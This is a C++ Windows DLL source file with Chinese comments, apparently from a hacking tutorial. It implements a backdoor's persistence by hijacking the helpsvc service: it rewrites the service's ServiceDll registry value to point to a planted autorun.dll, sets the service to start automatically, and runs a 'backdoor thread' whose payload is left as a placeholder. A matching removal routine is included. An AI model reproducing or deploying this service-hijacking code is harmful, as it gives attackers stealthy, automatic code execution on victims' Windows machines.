// autorun.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
#include <stdlib.h> 

SERVICE_STATUS        ServiceStatus;
SERVICE_STATUS_HANDLE ServiceStatusHandle;
DWORD WINAPI CmdService(LPVOID lpParam)
{
//...............后门代码
	return 0;
}

//服务控制函数
void WINAPI ServiceControl(DWORD dwCode)
{
    switch(dwCode)
    {
	//暂停服务
    case SERVICE_CONTROL_PAUSE:
        ServiceStatus.dwCurrentState = SERVICE_PAUSED;
        break;
	//继续执行服务
    case SERVICE_CONTROL_CONTINUE:
        ServiceStatus.dwCurrentState = SERVICE_RUNNING;
        break;
    //停止服务
    case SERVICE_CONTROL_STOP:      
        ServiceStatus.dwCurrentState  = SERVICE_STOPPED;
        ServiceStatus.dwWin32ExitCode = 0;
        ServiceStatus.dwCheckPoint    = 0;
        ServiceStatus.dwWaitHint      = 0;
		//设置服务状态
        if(SetServiceStatus(ServiceStatusHandle,&ServiceStatus)==0)
        {
            OutputDebugString("SetServiceStatus Error !\n");
        }
        return ;
    case SERVICE_CONTROL_INTERROGATE:
        break;
    default:
        break;
    }
    if(SetServiceStatus(ServiceStatusHandle,&ServiceStatus)==0)
    {
        OutputDebugString("SetServiceStatus  Error !\n");
    }
    return ;
}

//服务函数
void __stdcall ServiceMain(int argc, wchar_t* argv[] ) 
{
	HANDLE    hThread;
    ServiceStatus.dwServiceType             = SERVICE_WIN32;
    ServiceStatus.dwCurrentState            = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted        = SERVICE_ACCEPT_STOP
                                            | SERVICE_ACCEPT_PAUSE_CONTINUE;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    ServiceStatus.dwWin32ExitCode           = 0;
    ServiceStatus.dwCheckPoint              = 0;
    ServiceStatus.dwWaitHint                = 0;
    //得到服务进程名
	char svcname[256];
    strncpy(svcname, (char*)argv[0], sizeof(svcname)); 
    wcstombs(svcname, argv[0], sizeof(svcname));
	//注册服务控制函数
    ServiceStatusHandle=RegisterServiceCtrlHandler(svcname,ServiceControl);
    if(ServiceStatusHandle==0)
    {
        OutputDebugString("RegisterServiceCtrlHandler Error !\n");
        return ;
    }
    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    ServiceStatus.dwCheckPoint   = 0;
    ServiceStatus.dwWaitHint     = 0;
    //设置服务为运行状态
    if(SetServiceStatus(ServiceStatusHandle,&ServiceStatus)==0)
    {
        OutputDebugString("SetServiceStatus Error !\n");
        return ;
    }
    //启动后门线程
    hThread=CreateThread(NULL,0,CmdService,NULL,0,NULL);
    if(hThread==NULL)
    {
        OutputDebugString("CreateThread  Error !\n");
    }

    return ;
}
//修改字符串类型键值
void CreateStringReg(HKEY hRoot,char *szSubKey,char* ValueName,char *Data)
{
	HKEY hKey;
	//打开注册表键，不存在则创建它
	long lRet=RegCreateKeyEx(hRoot,szSubKey,0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,NULL);
    if (lRet!=ERROR_SUCCESS)
	{
		printf("error no RegCreateKeyEx %s\n", szSubKey);
		return ;
	}
	//修改注册表键值，没有则创建它
	lRet=RegSetValueEx(hKey,ValueName,0,REG_EXPAND_SZ,(BYTE*)Data,strlen(Data));
	 if (lRet!=ERROR_SUCCESS)
	 {
		 printf("error no RegSetValueEx %s\n", ValueName);
		 return ;
	 }
	RegCloseKey(hKey);
}

//用于修改数字类型键值
void CreateDWORDReg(HKEY hRoot,char *szSubKey,char* ValueName,DWORD Data)
{
	HKEY hKey;
	//打开注册表键，不存在则创建它
	long lRet=RegCreateKeyEx(hRoot,szSubKey,0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,NULL);
    if (lRet!=ERROR_SUCCESS)
	{
		printf("error no RegCreateKeyEx %s\n", szSubKey);
		return ;
	}
	DWORD dwSize=sizeof(DWORD);
	//修改注册表键值，没有则创建它
	lRet=RegSetValueEx(hKey,ValueName,0,REG_DWORD,(BYTE*)&Data,dwSize);
	 if (lRet!=ERROR_SUCCESS)
	 {
		 printf("error no RegSetValueEx %s\n", ValueName);
		 return ;
	 }
	RegCloseKey(hKey);
}

//安装后门
int Install()
{
	char NewDll[512];
	//得到系统目录
	GetSystemDirectory(NewDll,sizeof(NewDll));
	strcat(NewDll,"\\autorun.dll");
	//替换dll
	CreateStringReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\helpsvc\\Parameters","ServiceDll",NewDll);
	//设置为自动启动
	CreateDWORDReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\helpsvc","Start",2);
	return 0;
}

//卸载后门
int Remove()
{ 
	SC_HANDLE        schSCManager;
    SC_HANDLE        schService;
	SERVICE_STATUS NServiceStatus;
	//打开服务控制管理器数据库
	schSCManager=OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
	if(schSCManager==NULL)
	{
		OutputDebugString("OpenSCManager error \n");
		return 0;
	}
	//打开helpsvc服务
	schService=OpenService(schSCManager,"helpsvc",SERVICE_ALL_ACCESS);
	if(schService==NULL)
	{
        OutputDebugString("OpenService error \n");
		return 0;
	}
	//查看服务运行状况
	QueryServiceStatus(schService,&NServiceStatus);
	//假如处于运行状态则，停止该服务
	if(NServiceStatus.dwCurrentState==SERVICE_RUNNING)
	{
		ControlService(schService,SERVICE_CONTROL_STOP,&NServiceStatus);
	}
n    //还原ServiceDll键值
	char *OldDll="%WINDIR%\\PCHealth\\HelpCtr\\Binaries\\pchsvc.dll";
	CreateStringReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\helpsvc\\Parameters","ServiceDll",OldDll);
	return 0;
}

BOOL APIENTRY DllMain( HANDLE hModule, 
					  DWORD  ul_reason_for_call, 
					  LPVOID lpReserved
					  )
{
	switch (ul_reason_for_call) 
    { 
		//当动态链接库将要被卸载时，停止服务
    case DLL_PROCESS_DETACH: 
		{
		ServiceControl(SERVICE_CONTROL_STOP);	
        break; 
		}
	default:
		break;
	}	
    return TRUE;
}




